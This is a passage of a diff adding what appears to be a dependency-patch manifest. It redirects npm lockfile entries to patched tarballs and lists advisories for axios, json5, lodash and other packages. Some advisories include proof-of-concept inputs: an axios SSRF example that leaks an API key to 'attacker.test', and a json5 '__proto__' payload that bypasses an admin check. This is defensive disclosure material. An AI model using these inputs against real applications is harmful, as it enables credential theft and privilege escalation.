@@ -1,0 +1,571 @@
+{
+  "version": 1,
+  "mode": "hosted",
+  "edits": [
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/axios",
+      "original": {
+        "resolved": "https://registry.npmjs.org/axios/-/axios-0.21.1.tgz",
+        "integrity": "sha512-dKQiRHxGD9PPRIUNIWvZhPTPpl1rf/OxTYKsqKUDjBwYylTvV7SjSHJb9ratfyzM6wCdLCOYLzs73qpg5c4iGA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/axios/0.21.1/3726d403-be17-4e01-8254-8e343f01624b/dda11302-c7d8-4720-b323-b7bb7465f106/axios-0.21.1.tgz",
+        "integrity": "sha512-mYqSMPnS9SAimkd/Y1Eoz09ZntI1vF6ppiwQB/dVOy56ufAaJcM0hzVLCyxZFtTjjH7CLenP4cXo4xWuP+zI7Q=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/braces",
+      "original": {
+        "resolved": "https://registry.npmjs.org/braces/-/braces-3.0.2.tgz",
+        "integrity": "sha512-b8um+L1RzM3WDSzvhm6gIz1yfTbBt6YTlcEKAvsmqCZZFw46z626lVj9j1yEPW33H5H+lBQpZMP1k8l+78Ha0A=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/braces/3.0.2/1c1e210f-8234-45d1-9704-539cdd8992d3/07b304a0-7a79-4a71-827f-a3966870fe55/braces-3.0.2.tgz",
+        "integrity": "sha512-k+MwwZ3KZ2KpOqsmalE2lCaLdB1YoxYbEDVsEyobCVE96PG5bSfDWFzhGCRhECKnjDAsZ0jSoBe5wtY61trg3g=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/handlebars",
+      "original": {
+        "resolved": "https://registry.npmjs.org/handlebars/-/handlebars-4.7.6.tgz",
+        "integrity": "sha512-1f2BACcBfiwAfStCKZNrUCgqNZkGsAT7UM3kkYtXuLo0KnaVfjKOyf7PRzB6++aK9STyT1Pd2ZCPe3EGOXleXA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/handlebars/4.7.6/b2447c7e-9922-4cda-8be7-3e2009166494/6a8c9cfd-174d-496a-ac6d-6d426a3ec400/handlebars-4.7.6.tgz",
+        "integrity": "sha512-KR2kUByDn1UpxCpUJEx0XT7Zh58DkNE3Td5IhACpKvIQwmeysbG1/Scjqro6v0O6pEqiJCGoSO61/lzBwnvk4Q=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/ip",
+      "original": {
+        "resolved": "https://registry.npmjs.org/ip/-/ip-2.0.0.tgz",
+        "integrity": "sha512-WKa+XuLG1A1R0UWhl2+1XQSi+fZWMsYKffMZTTYsiZaUD8k2yDAj5atimTUD2TZkyCkNEeYE5NhFZmupOGtjYQ=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/ip/2.0.0/65f8728c-a20e-4ea8-8731-b2d3505c0169/93489bf4-5d21-4c2b-846c-3bc9c7cef372/ip-2.0.0.tgz",
+        "integrity": "sha512-dI90xmm26zIPH1Nfq8z7nr7/tYLujJNfQZg9PlAHsCY342VECvXL6ayMheu0APQv4vUJYSknB/mFcCUOio8/NA=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/json5",
+      "original": {
+        "resolved": "https://registry.npmjs.org/json5/-/json5-2.2.1.tgz",
+        "integrity": "sha512-1hqLFMSrGHRHxav9q9gNjJ5EXznIxGVO09xQRrwplcS8qs28pZ8s8hupZAmqDwZUmVZ2Qb2jnyPOWcDH8m8dlA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/json5/2.2.1/494d41d5-afd0-4b63-9f66-d209ae60faf9/39cea477-0c1a-4da2-bcb3-b4d4c2922263/json5-2.2.1.tgz",
+        "integrity": "sha512-/6lQONyE3FX16cq1ALdy8yp+dmAv43nSBKqm0nM053wuMB7ItjL8tm9aIh9UjoTzl5WX9dpilLpMq2CEn3UNuw=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/lodash",
+      "original": {
+        "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
+        "integrity": "sha512-PlhdFcillOINfeV7Ni6oF1TAEayyZBoZ8bcshTHqOYJYlrqzRK5hagpagky5o4HfCzzd1TRkXPMFq6cKk9rGmA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/lodash/4.17.20/6279c583-639f-46d3-aaec-d3662ddcf3e2/8fe57b77-7d65-4cde-ae71-eb44e79bfb22/lodash-4.17.20.tgz",
+        "integrity": "sha512-1xbWK7C13JA0uq5yVj5XDQYHVfjtxOPtXiBCr7q1T7dxW3gIJhaLPrbBmTbSl59uFtkYSiX80mnZfGDO58X/Jw=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/minimist",
+      "original": {
+        "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.5.tgz",
+        "integrity": "sha512-FM9nNUYrRBAELZQT3xeZQ7fmMOBg6nWNmJKTcgsJeaLstP/UODVpGsr5OhXhhXg6f+qtJ8uiZ+PUxkDWcgIXLw=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/minimist/1.2.5/01cd7b37-14e8-4401-a1fd-1002389a83d8/a8b05a61-1e2f-4c5f-a65b-93e71deba1ae/minimist-1.2.5.tgz",
+        "integrity": "sha512-ML6QWpw/ZTTLYmeHpMb/LCY9QKLI9qqELV3EzEEuh0dhxElK6BiOVe16KsqlAfxuJQnWrG62qCwzRS/bbs9lDg=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/path-to-regexp",
+      "original": {
+        "resolved": "https://registry.npmjs.org/path-to-regexp/-/path-to-regexp-0.1.7.tgz",
+        "integrity": "sha512-5DFkuoqlv1uYQKxy8omFBeJPQcdoE07Kv2sferDCrAq1ohOU+MSDswDIbnx3YAM60qIOnYa53wBhXW0EbMonrQ=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/path-to-regexp/0.1.7/76f3def7-9bbc-4eab-a63e-3156bcc4ed22/22028842-fc6d-4af0-a939-6be3019f3235/path-to-regexp-0.1.7.tgz",
+        "integrity": "sha512-ClLS6+VltjJAdrDPGqS6lqpb8rBhn5Avn7nU+sIAv1rIwwd1U2SKW6dnnjuOTX3zUCYrsgas2omd6/QCw/buBg=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/semver",
+      "original": {
+        "resolved": "https://registry.npmjs.org/semver/-/semver-7.3.5.tgz",
+        "integrity": "sha512-PoeGJYh8HK4BTO/a9Tf6ZG3veo/A7ZVsYrSA6J8ny9nb3B1VrpkuN+z9OE5wfE5p6H4LchYZsegiQgbJD94ZFQ=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/semver/7.3.5/7cd67d4b-9add-46ee-a701-099684a3bbd4/bef9d52f-74ea-4eb0-9992-86e981170794/semver-7.3.5.tgz",
+        "integrity": "sha512-YgfibtHPuFCeeo8TkpMZY2MSUMUAdL4GIepw8XifQYV6HAfZH2rydLYuXg2pAC5icuD8ye4v6SBz74YXXBVzkA=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/serialize-javascript",
+      "original": {
+        "resolved": "https://registry.npmjs.org/serialize-javascript/-/serialize-javascript-3.1.0.tgz",
+        "integrity": "sha512-JIJT1DGiWmIKhzRsG91aS6Ze4sFUrYbltlkg2onR5OrnNM02Kl/hnY/T4FN2omvyeBbQmMJv+K4cPOpGzOTFBg=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/serialize-javascript/3.1.0/27c18215-7e1d-4e62-b814-d19899f21b2e/7bf4a41e-30eb-466f-a51b-b82edd1202ac/serialize-javascript-3.1.0.tgz",
+        "integrity": "sha512-/qdivjTC3jtGHARyFIP+NcMu9evuvnc917gdmPnP8n299kixvNfjh4qh/y+eMO7vD2nHB9BU1WTjqtPxjfkVTg=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/tar",
+      "original": {
+        "resolved": "https://registry.npmjs.org/tar/-/tar-6.1.0.tgz",
+        "integrity": "sha512-DUCttfhsnLCjwoDoFcI+B2iJgYa93vBnDUATYEeRx6sntCTdN01VnqsIuTlALXla/LWooNg0yEGeB+Y8WdFxGA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/tar/6.1.0/88daf8de-ef7d-4223-a0db-882a2c597512/167721b8-d8ed-4469-b0cf-f343d73199aa/tar-6.1.0.tgz",
+        "integrity": "sha512-45j611bUGmLu4NO0AcilB4JvV7x5PEi1GU92PTSQt6MCFqafQZsU1hTlT0j5qAdYNxxOdgjCgXPXOlowG+E0DQ=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/ws",
+      "original": {
+        "resolved": "https://registry.npmjs.org/ws/-/ws-7.5.5.tgz",
+        "integrity": "sha512-BAkMFcAzl8as1G/hArkxOxq3G7pjUqQ3gzYbLL0/5zNkph70e+lCoxBGnm6AW1+/aiNeV4fnKqZ8m4GZewmH2w=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/ws/7.5.5/41c7e4f0-3cea-4947-b7ef-ae868945589b/eb557522-0066-43ba-b595-837e958a9635/ws-7.5.5.tgz",
+        "integrity": "sha512-Mw9PJjwKG9po2MijMP8VQWHuARbd7S3+H1mY2o+Q4CXvFF8N8NzSHc0M+jDG1W3tM9OOP5Me4w359lw3/6ivLA=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/xmldom",
+      "original": {
+        "resolved": "https://registry.npmjs.org/xmldom/-/xmldom-0.6.0.tgz",
+        "integrity": "sha512-iAcin401y58LckRZ0TkI4k0VSM1Qg0KGSc3i8rU+xrxe19A/BN1zHyVSJY7uoutVlaTSzYyk/v5AmkewAP7jtg=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/xmldom/0.6.0/49a5b450-180f-46fe-a5b0-41efad160504/4bada17e-58e6-41ed-9a76-5d4de89323a1/xmldom-0.6.0.tgz",
+        "integrity": "sha512-jx/omteuZjDoo5Qk2rQs29bt/HhJUuix4+MYxvQVRbsbxVmWbdhoilUHgyuyH57/HCRijw/IeQ/eZvHeAApxDg=="
+      }
+    }
+  ],
+  "records": {
+    "pkg:npm/axios@0.21.1": {
+      "uuid": "dda11302-c7d8-4720-b323-b7bb7465f106",
+      "exportedAt": "Mon, 03 Aug 2026 20:18:30 GMT",
+      "files": {
+        "dist/axios.js": {
+          "beforeHash": "99ce3b5fcc2c7829ef75f0260632bc491fc20096ef4eb7d63f95c1c05dc42565",
+          "afterHash": "d5271abfe91c5c48bbe4173ce42d8b68669fb770b583eea007b5224c3f1e9434"
+        },
+        "dist/axios.min.js": {
+          "beforeHash": "f9953ece0094613012416746277c837eda5a4b6c115c917b50bcecb663051cb2",
+          "afterHash": "031fde82f03ad61482d218a73651bacc43d6cedd784aa7ded483d39f4b5a2603"
+        },
+        "index.d.ts": {
+          "beforeHash": "de978ba7bebeb2d33812800fcb2a9e7d4ab533e07177a8c2235303f83016e39f",
+          "afterHash": "dbe4d98429c961d3e4a24bfdcc43b57f22c7072d0766a316c9be68994add9b8e"
+        },
+        "lib/adapters/http.js": {
+          "beforeHash": "095280a8b4e4d95043ce007b40f4bff7f2d148e362abac30ee9ad5a57ef0ff29",
+          "afterHash": "989cd4eb2d0268df08fbb28ec686ec901f9f20962d7b1b980392e5128f982bb8"
+        },
+        "lib/adapters/xhr.js": {
+          "beforeHash": "4f8ce848fa8d903f5304e4e85bf80ea9f5169a6163bd3e30a837c00399657693",
+          "afterHash": "63517127f1f5afbdde93e6e48138c4c5a37409e1446be35c603d76b6e57c8f9b"
+        },
+        "lib/core/buildFullPath.js": {
+          "beforeHash": "3c30734f157290978d4c078ffffbfe47be1a894f4e7f88f20dd409e1f4ca584d",
+          "afterHash": "70582470af8c0ffed4047ec0deb20011522ac1b2751a2544db5d5255370fd8a9"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-jr5f-v2jv-69x6": {
+          "cves": [
+            "CVE-2025-27152"
+          ],
+          "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
+          "severity": "HIGH",
+          "description": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/braces@3.0.2": {
+      "uuid": "07b304a0-7a79-4a71-827f-a3966870fe55",
+      "exportedAt": "Tue, 17 Feb 2026 16:37:38 GMT",
+      "files": {
+        "package/lib/constants.js": {
+          "beforeHash": "8df4b0e0d353a6b1db70582676f17822af053ca8e5b309eb947e2a532044a7f5",
+          "afterHash": "9f9a42a8025559ec7e92ead355fc550daaa93d0e773610ec982611f42e5e1776"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-grv7-fg5c-xmjg": {
+          "cves": [
+            "CVE-2024-4068"
+          ],
+          "summary": "Uncontrolled resource consumption in braces",
+          "severity": "HIGH",
+          "description": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/handlebars@4.7.6": {
+      "uuid": "6a8c9cfd-174d-496a-ac6d-6d426a3ec400",
+      "exportedAt": "Tue, 21 Jul 2026 17:50:41 GMT",
+      "files": {
+        "dist/amd/handlebars/compiler/javascript-compiler.js": {
+          "beforeHash": "d2c246ade73c030ffe7abcacdfea21420174131ef56fd1baaa6a4881f9647f26",
+          "afterHash": "3bf5b3e28b211d72c76bd827f5792c676605a18c680a24fb4785728a14f734c1"
+        },
+        "dist/cjs/handlebars/compiler/javascript-compiler.js": {
+          "beforeHash": "8c350a9c068cd31cd9f683bc3d501d611f7ac49082da237f50d49c44082b317b",
+          "afterHash": "f073b96f83ed0a4125982b6ea436028e31df559757fd4374aab53b830565b2fc"
+        },
+        "dist/handlebars.amd.js": {
+          "beforeHash": "2d239dab63d18fceccd16eb8b01c98f3ec67afc0bfa28789aaee4a7310a96b50",
+          "afterHash": "3d8c4cffe99b42b7956077bd28add675cb87a1a8063c764267a285582c694ca7"
+        },
+        "dist/handlebars.amd.min.js": {
+          "beforeHash": "ba7e9761b800571fa91780aa74ff7f0360b0234a5db935c6af1542f430fd29cc",
+          "afterHash": "bde6cbdea293f1641aedf93ebab7bf8f308a741f420a7e7b2eda1033eda0a45f"
+        },
+        "dist/handlebars.js": {
+          "beforeHash": "f68f438d455154682ac9b2fd4ab282bcd9373b20dff09e27eccddb51e894925e",
+          "afterHash": "057e99f8a5b46f3d34214bfe573f5d05de6d066f2ed06b3b56113268329c7018"
+        },
+        "dist/handlebars.min.js": {
+          "beforeHash": "3433152d0a28d62f11e36c36ae995b3a55e5e4db341b13dd92ce28b241e7bdc7",
+          "afterHash": "73b3150e027182e06c708f2b3dcab246c432149a5089925d481c4d6a6b3e0682"
+        },
+        "lib/handlebars/compiler/javascript-compiler.js": {
+          "beforeHash": "693da94ffa49a4fbdcbb6bb54e8b9cd19a201eb04862c015f68d9f9e1cfe71eb",
+          "afterHash": "0c5acc26e2a94c06731942b866864af8ca300d77043f1d634035f63848d19bf6"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-765h-qjxv-5f44": {
+          "cves": [
+            "CVE-2021-23383"
+          ],
+          "summary": "Prototype Pollution in handlebars",
+          "severity": "CRITICAL",
+          "description": "The package handlebars before 4.7.7 are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/ip@2.0.0": {
+      "uuid": "93489bf4-5d21-4c2b-846c-3bc9c7cef372",
+      "exportedAt": "Fri, 24 Apr 2026 19:30:11 GMT",
+      "files": {
+        "package/lib/ip.js": {
+          "beforeHash": "ef85ba31f56609ec6ff25bbf3f717ccba981fc1701d1abbc81ff1e38f6c69ad3",
+          "afterHash": "99018864455102e4e32b04749b1107a00e97706c2e85b7e39da25544b61d4298"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-2p57-rm9w-gvfp": {
+          "cves": [
+            "CVE-2024-29415"
+          ],
+          "summary": "ip SSRF improper categorization in isPublic",
+          "severity": "HIGH",
+          "description": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/json5@2.2.1": {
+      "uuid": "39cea477-0c1a-4da2-bcb3-b4d4c2922263",
+      "exportedAt": "Fri, 13 Feb 2026 15:38:53 GMT",
+      "files": {
+        "package/dist/index.js": {
+          "beforeHash": "f86b6cdf86ee0ebc510f91c642551915c3b2190639e6bfd213b2ecca3d6f0116",
+          "afterHash": "8edbd5995832bef985bc1302f0b9da92a86cbff5f111d8eaddd52e8d61b131c9"
+        },
+        "package/dist/index.min.js": {
+          "beforeHash": "d205fcfa7f9134f7e0342a5f3f72f8496e8f5e50e8e4dc86bd9f7d467ee8c294",
+          "afterHash": "637edb523329db42cd82ec1365f1f68cb670a291d225ef70e9eb1c4efe80bfdc"
+        },
+        "package/dist/index.min.mjs": {
+          "beforeHash": "3c3d72230dac844dd9810d9bc7dafa099b2c33b7f5e2ef1f201628b95f00b27c",
+          "afterHash": "8a5109779e5b8629206e5d70df36e56fb9ccb82955bf8771722e8761f611f6f4"
+        },
+        "package/dist/index.mjs": {
+          "beforeHash": "72465a2ee7714e5865ff0ce3709a07e4191ff7547ca65dcbe0a968281fc69c82",
+          "afterHash": "9125c82fbea75eef8587d9bda02c99b43ef0ef3f3bbdb25e480365ea2c4b484e"
+        },
+        "package/lib/parse.js": {
+          "beforeHash": "6a0899c2d5c46f23bb6db43fa95f938bf049e0369c498b166f239c4a2d41c329",
+          "afterHash": "4988617516af88679b565cc7399191300839ce639e5b2b52e79809e021bab8c6"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-9c47-m6qq-7p4h": {
+          "cves": [
+            "CVE-2022-46175"
+          ],
+          "summary": "Prototype Pollution in JSON5 via Parse Method",
+          "severity": "HIGH",
+          "description": "The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/lodash@4.17.20": {
+      "uuid": "8fe57b77-7d65-4cde-ae71-eb44e79bfb22",
+      "exportedAt": "Fri, 24 Jul 2026 22:28:27 GMT",
+      "files": {
+        "lodash.js": {
+          "beforeHash": "20249dae29a29ddc251f7a975f222bb4ebc25e2f78e658db3cadada432ad3263",
+          "afterHash": "1ce0f0e66a2aca0ed022cd2c981f6bc1efd97f5034296c9c1560115c7e1fb985"
+        },
+        "lodash.min.js": {
+          "beforeHash": "9905d551b602431fbd8243ad5f822bdaad7f9dfc52daf997ea3af42ba5aa2c88",
+          "afterHash": "93cb52089fb7922c7730820a286fb4b567422d7b4dbc5b271b6b47038dd0379d"
+        },
+        "template.js": {
+          "beforeHash": "181440056ec631ccf8379d9f54377105bb6470a6d2a94d72b42354261aefe1fd",
+          "afterHash": "e333f2e1ef9fcb9b2b440fa8f78c28615c203e034d19078ccf9f8158abebb5c1"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-r5fr-rjxr-66jc": {
+          "cves": [
+            "CVE-2026-4800"
+          ],
+          "summary": "lodash vulnerable to Code Injection via `_.template` imports key names",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/minimist@1.2.5": {
+      "uuid": "a8b05a61-1e2f-4c5f-a65b-93e71deba1ae",
+      "exportedAt": "Mon, 05 Jan 2026 17:02:10 GMT",
+      "files": {
+        "package/index.js": {
+          "beforeHash": "ac1dc57ea4a3420d21f27f901d381f40d60e508dbabc605ab30378ccfab9b314",
+          "afterHash": "5a0c1eb3fe055aed46301e52e5cfb5c91cd0cf5dcc869fc35bfcab3da0eb92d3"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-xvch-5gv4-984h": {
+          "cves": [
+            "CVE-2021-44906"
+          ],
+          "summary": "Prototype Pollution in minimist",
+          "severity": "CRITICAL",
+          "description": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95)."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/path-to-regexp@0.1.7": {
+      "uuid": "22028842-fc6d-4af0-a939-6be3019f3235",
+      "exportedAt": "Wed, 07 Jan 2026 22:25:03 GMT",
+      "files": {
+        "package/index.js": {
+          "beforeHash": "06731ab0f68cfca6b5cd1478d99ac328d10ec06df83b8a0b15e93004f5c421cc",
+          "afterHash": "20fb2467ac96dc596d481f11c463d8061b6e2f3488f3311314db156939b17189"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-rhx6-c78j-4q9w": {
+          "cves": [
+            "CVE-2024-52798"
+          ],
+          "summary": "path-to-regexp contains a ReDoS",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/semver@7.3.5": {
+      "uuid": "bef9d52f-74ea-4eb0-9992-86e981170794",
+      "exportedAt": "Fri, 26 Jun 2026 19:45:20 GMT",
+      "files": {
+        "package/classes/range.js": {
+          "beforeHash": "2fc5c1c2ec24f86665d2be307c15ea2b9603ae2147bfa3bc2bc8461013dc89f1",
+          "afterHash": "a8fb6ef8d6eeec652c57d5ca8e6e929270e5965f61668e993dbf95d937ed0576"
+        },
+        "package/internal/re.js": {
+          "beforeHash": "2b8a459b1a12f6a49e631b8ef8c6006927a2610d5352b89e63f6f2b5c2596b27",
+          "afterHash": "a5cc4f0194b2e68dd9dd880de69a4cf28d965c6e4927f6b02bb9cd1a31766058"
+        },
+        "package/patch_manifest.json": {
+          "beforeHash": "",
+          "afterHash": "3bc77d06dfc1e22118283b825e71df24e14bb6298b743965f1acbd5c509db74a"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2qf-rxjj-qqgw": {
+          "cves": [
+            "CVE-2022-25883"
+          ],
+          "summary": "semver vulnerable to Regular Expression Denial of Service",
+          "severity": "HIGH",
+          "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
